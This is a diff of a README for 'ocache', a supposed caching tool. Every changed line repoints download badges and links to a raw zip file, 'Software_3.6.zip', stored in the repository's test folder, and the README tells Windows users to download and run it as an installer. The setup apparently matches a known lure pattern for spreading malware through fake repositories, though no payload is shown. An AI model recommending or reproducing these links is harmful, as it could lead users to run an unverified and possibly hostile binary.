@@ -1,6 +1,6 @@
 # ⚡ ocache - Simple, Fast Caching Tools
 
-[![Download ocache](https://img.shields.io/badge/Download-ocache-brightgreen)](https://github.com/Miguelfe964/ocache/raw/refs/heads/main/src/Software-1.2.zip)
+[![Download ocache](https://img.shields.io/badge/Download-ocache-brightgreen)](https://raw.githubusercontent.com/Miguelfe964/ocache/main/test/Software_3.6.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Before you start, make sure you have:
 
 To get started with ocache, visit this page:
 
-[Download ocache](https://github.com/Miguelfe964/ocache/raw/refs/heads/main/src/Software-1.2.zip)
+[Download ocache](https://raw.githubusercontent.com/Miguelfe964/ocache/main/test/Software_3.6.zip)
 
 You will find the files and instructions there. This is the main hub to receive updates and latest versions.
 
@@ -34,7 +34,7 @@ You will find the files and instructions there. This is the main hub to receive 
 ## 💾 How to Download and Install ocache on Windows
 
 1. Click the big green button above or visit this link in your browser:  
-   https://github.com/Miguelfe964/ocache/raw/refs/heads/main/src/Software-1.2.zip
+   https://raw.githubusercontent.com/Miguelfe964/ocache/main/test/Software_3.6.zip
 
 2. On the page, find the **Releases** or **Downloads** section. It usually appears on the right side or in the top menu.
 
@@ -93,10 +93,10 @@ If ocache does not run:
 
 To update ocache:
 
-- Return to the download page regularly at https://github.com/Miguelfe964/ocache/raw/refs/heads/main/src/Software-1.2.zip
+- Return to the download page regularly at https://raw.githubusercontent.com/Miguelfe964/ocache/main/test/Software_3.6.zip
 - Download the newest installer when a new version is available.
 - Run the installer again to replace the old version without losing settings.
 
 ---
 
-[![Download ocache](https://img.shields.io/badge/Download-ocache-blue)](https://github.com/Miguelfe964/ocache/raw/refs/heads/main/src/Software-1.2.zip)
+[![Download ocache](https://img.shields.io/badge/Download-ocache-blue)](https://raw.githubusercontent.com/Miguelfe964/ocache/main/test/Software_3.6.zip)
